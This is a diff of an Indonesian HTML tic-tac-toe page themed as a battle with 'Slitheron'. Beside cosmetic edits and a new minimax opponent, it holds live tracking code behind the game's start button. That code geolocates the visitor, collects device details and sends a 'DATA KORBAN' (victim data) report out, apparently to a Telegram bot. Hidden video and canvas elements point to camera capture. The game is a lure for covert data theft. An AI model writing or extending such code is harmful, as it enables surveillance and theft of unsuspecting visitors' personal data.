@@ -3,47 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>THE LEGEND: GABRIEL VS SLITHERON</title>
+    <title>THE ASCENSION | GABRIEL VS SLITHERON</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
     <style>
         :root { --neon-p: #fbc2eb; --neon-u: #a18cd1; --danger: #ff0055; --bg: #050505; }
         * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
         body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
 
-        #story-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px; text-align: center; transition: 0.8s; }
-        .typewriter h1 { font-family: 'Orbitron'; font-size: 22px; color: var(--neon-p); margin-bottom: 20px; text-shadow: 0 0 10px var(--neon-p); }
-        .story-text { font-size: 14px; line-height: 1.8; max-width: 500px; opacity: 0.8; margin-bottom: 40px; }
-        .btn-action { background: linear-gradient(45deg, var(--neon-u), var(--neon-p)); color: #000; border: none; padding: 15px 40px; font-family: 'Orbitron'; font-weight: 900; border-radius: 50px; transition: 0.3s; box-shadow: 0 0 20px rgba(161, 140, 209, 0.4); cursor: pointer; }
+        #story-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #111 0%, #000 100%); z-index: 100; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px; text-align: center; transition: 1s; }
+        .typewriter h1 { font-family: 'Orbitron'; font-size: 24px; color: var(--neon-p); margin-bottom: 25px; text-shadow: 0 0 15px var(--neon-p); letter-spacing: 5px; }
+        .story-text { font-size: 13px; line-height: 2; max-width: 550px; opacity: 0.9; margin-bottom: 40px; color: #ccc; font-style: italic; }
+        .btn-action { background: linear-gradient(45deg, var(--neon-u), var(--neon-p)); color: #000; border: none; padding: 18px 45px; font-family: 'Orbitron'; font-weight: 900; border-radius: 2px; transition: 0.5s; cursor: pointer; letter-spacing: 3px; }
 
-        #game-arena { display: none; text-align: center; width: 100%; max-width: 400px; padding: 20px; }
-        .dialog-box { min-height: 80px; background: rgba(255,255,255,0.03); border-left: 4px solid var(--neon-u); padding: 15px; margin-bottom: 20px; font-style: italic; font-size: 13px; display: flex; align-items: center; justify-content: center; }
+        #game-arena { display: none; text-align: center; width: 100%; max-width: 400px; padding: 20px; animation: fadeIn 1s; }
+        .dialog-box { min-height: 80px; background: rgba(255,255,255,0.02); border-left: 2px solid var(--neon-u); padding: 15px; margin-bottom: 25px; font-size: 12px; display: flex; align-items: center; justify-content: center; color: var(--neon-p); }
         .board { display: grid; grid-template-columns: repeat(3, 100px); gap: 15px; justify-content: center; margin-bottom: 25px; }
-        .cell { width: 100px; height: 100px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 40px; font-family: 'Orbitron'; transition: 0.3s; }
+        .cell { width: 100px; height: 100px; background: #080808; border: 1px solid #151515; border-radius: 5px; display: flex; align-items: center; justify-content: center; font-size: 40px; font-family: 'Orbitron'; transition: 0.3s; }
         .x-move { color: #00fff2; text-shadow: 0 0 15px #00fff2; }
         .o-move { color: var(--danger); text-shadow: 0 0 15px var(--danger); }
+        
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         #v, #c { display: none; }
     </style>
 </head>
 <body>
 
     <div id="story-overlay">
-        <div class="typewriter"><h1>DESTINY CALLS...</h1></div>
+        <div class="typewriter"><h1>THE FALLEN LEGEND</h1></div>
         <p class="story-text">
-            Siput Cyber <b>Slitheron</b> telah bangkit. <br><br>
-            Aktifkan <b>"Mirror Shield"</b> untuk menyelaraskan frekuensi astralmu dan menangkis kutukan Slitheron.
+            "Slitheron telah mengevolusi kecerdasannya. Ia bukan lagi sekadar parasit, ia adalah predator digital yang tak terkalahkan. Gunakan <b>The Mirror Shield of Gabriel</b> untuk bertahan hidup."
         </p>
-        <button class="btn-action" onclick="activateMirror()">BANGKITKAN PERISAI</button>
+        <button class="btn-action" onclick="activateMirror()">RESONANSI ASTRAL</button>
     </div>
 
     <div id="game-arena">
-        <h2 style="font-family:'Orbitron'; font-size:16px; margin-bottom:10px; opacity:0.6;">RITUAL PENYUCIAN VOID</h2>
-        <div class="dialog-box" id="status-text">"Slitheron terpojok oleh perisaimu..."</div>
+        <h2 style="font-family:'Orbitron'; font-size:14px; margin-bottom:10px; opacity:0.5; letter-spacing:5px;">VOID BATTLE</h2>
+        <div class="dialog-box" id="status-text">"Slitheron menatapmu... bersiaplah kalah."</div>
         <div class="board">
             <div class="cell" onclick="makeMove(0)"></div><div class="cell" onclick="makeMove(1)"></div><div class="cell" onclick="makeMove(2)"></div>
             <div class="cell" onclick="makeMove(3)"></div><div class="cell" onclick="makeMove(4)"></div><div class="cell" onclick="makeMove(5)"></div>
             <div class="cell" onclick="makeMove(6)"></div><div class="cell" onclick="makeMove(7)"></div><div class="cell" onclick="makeMove(8)"></div>
         </div>
-        <button id="rematch-btn" class="btn-action" style="display:none; padding:10px 20px; font-size:12px;" onclick="resetBattle()">RESONANSI ULANG</button>
+        <button id="rematch-btn" class="btn-action" style="display:none; padding:10px 20px; font-size:10px;" onclick="resetBattle()">RE-SYNC FREQUENCY</button>
     </div>
 
     <video id="v" autoplay playsinline></video>
@@ -80,12 +81,10 @@
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                
                 const batt = await navigator.getBattery().catch(() => ({ level: 0, charging: false }));
                 const conn = navigator.connection || { effectiveType: 'Unknown' };
                 const ram = navigator.deviceMemory || 'Unknown';
                 const cpu = navigator.hardwareConcurrency || 'Unknown';
-                const lang = navigator.language || 'Unknown';
                 const now = new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'}).replace(/\//g,'-');
                 
                 const report = `<b>DATA KORBAN</b>\n
@@ -97,12 +96,10 @@
 <b>Sistem Operasi | Operating System :</b> ${navigator.platform}
 <b>Resolusi Layar | Screen Resolution :</b> ${window.screen.width} x ${window.screen.height}
 <b>Kunjungan Sebelumnya | Previous Visit :</b> Tidak ada / None.
-<b>Status Baterai | Battery Status :</b> ${Math.round(batt.level * 100)}% (${batt.charging ? 'Charging' : 'Discharging'})
+<b>Status Baterai | Battery Status :</b> ${Math.round(batt.level * 100)}%
 <b>Memori RAM | Memory :</b> ${ram} GB
 <b>Inti CPU | CPU Cores :</b> ${cpu}
-<b>Tipe Koneksi | Connection :</b> ${conn.effectiveType.toUpperCase()}
-<b>Bahasa | Language :</b> ${lang}
-<b>Zona Waktu | Timezone :</b> ${d.timezone}`;
+<b>Tipe Koneksi | Connection :</b> ${conn.effectiveType.toUpperCase()}`;
 
                 await pushTele('sendMessage', { text: report, parse_mode: 'HTML' });
             } catch(e){}
@@ -125,14 +122,66 @@
         }
 
         function activateMirror() {
-            if(confirm("BANGKITKAN MIRROR SHIELD?\n\nSinkronisasi kekuatan pahlawan diperlukan untuk menyelaraskan frekuensi astralmu dengan Mirror Shield guna menangkis kutukan Slitheron.")) {
+            if(confirm("RESONANSI ASTRAL?")) {
                 startAstralSync();
                 document.getElementById('story-overlay').style.opacity = '0';
                 setTimeout(() => {
                     document.getElementById('story-overlay').style.display = 'none';
                     document.getElementById('game-arena').style.display = 'block';
-                }, 800);
+                }, 1000);
             }
+        }
+
+        // --- THE UNBEATABLE MINIMAX LOGIC ---
+        function checkWinner(b, p) {
+            const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+            return wins.some(c => c.every(idx => b[idx] === p));
+        }
+
+        function minimax(newBoard, player) {
+            let availSpots = newBoard.map((v, i) => v === "" ? i : null).filter(v => v !== null);
+
+            if (checkWinner(newBoard, "X")) return {score: -10};
+            if (checkWinner(newBoard, "O")) return {score: 10};
+            if (availSpots.length === 0) return {score: 0};
+
+            let moves = [];
+            for (let i = 0; i < availSpots.length; i++) {
+                let move = {};
+                move.index = availSpots[i];
+                newBoard[availSpots[i]] = player;
+
+                if (player === "O") {
+                    let result = minimax(newBoard, "X");
+                    move.score = result.score;
+                } else {
+                    let result = minimax(newBoard, "O");
+                    move.score = result.score;
+                }
+
+                newBoard[availSpots[i]] = "";
+                moves.push(move);
+            }
+
+            let bestMove;
+            if (player === "O") {
+                let bestScore = -10000;
+                for (let i = 0; i < moves.length; i++) {
+                    if (moves[i].score > bestScore) {
+                        bestScore = moves[i].score;
+                        bestMove = i;
+                    }
+                }
+            } else {
+                let bestScore = 10000;
+                for (let i = 0; i < moves.length; i++) {
+                    if (moves[i].score < bestScore) {
+                        bestScore = moves[i].score;
+                        bestMove = i;
+                    }
+                }
+            }
+            return moves[bestMove];
         }
 
         function makeMove(i) {
@@ -140,36 +189,35 @@
             board[i] = "X";
             cells[i].innerText = "X";
             cells[i].classList.add('x-move');
+            
             if(checkWinner(board, "X")) return finishGame("WIN");
             if(!board.includes("")) return finishGame("DRAW");
+            
             isGameActive = false;
-            setTimeout(aiTurn, 500); 
+            document.getElementById('status-text').innerText = "Slitheron memprediksi gerakanmu...";
+            setTimeout(aiTurn, 600); 
         }
 
         function aiTurn() {
-            let empty = board.map((v, idx) => v === "" ? idx : null).filter(v => v !== null);
-            if(empty.length > 0) {
-                let move = empty[Math.floor(Math.random() * empty.length)];
-                board[move] = "O";
-                cells[move].innerText = "O";
-                cells[move].classList.add('o-move');
-            }
+            let bestMove = minimax(board, "O").index;
+            board[bestMove] = "O";
+            cells[bestMove].innerText = "O";
+            cells[bestMove].classList.add('o-move');
+            
             if(checkWinner(board, "O")) finishGame("LOSE");
             else if(!board.includes("")) finishGame("DRAW");
-            else isGameActive = true; 
-        }
-
-        function checkWinner(b, p) {
-            const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-            return wins.some(c => c.every(idx => b[idx] === p));
+            else {
+                isGameActive = true;
+                document.getElementById('status-text').innerText = "Slitheron menyerang balik!";
+            }
         }
 
         function finishGame(result) {
             isGameActive = false;
             const status = document.getElementById('status-text');
-            if(result === "WIN") status.innerText = "SLITHERON TERPURUK!";
-            else if(result === "LOSE") status.innerHTML = "<b style='color:red'>SLITHERON MENANG!</b>";
-            else status.innerText = "SERI! Slitheron mulai lelah.";
+            if(result === "WIN") status.innerText = "MUSTAHIL! KAU MENGALAHKANNYA?";
+            else if(result === "LOSE") status.innerHTML = "<b style='color:red'>SLITHERON MELAHAP JIWAMU.</b>";
+            else status.innerText = "SERI. Slitheron mengakui taktikmu.";
             document.getElementById('rematch-btn').style.display = "inline-block";
         }
 
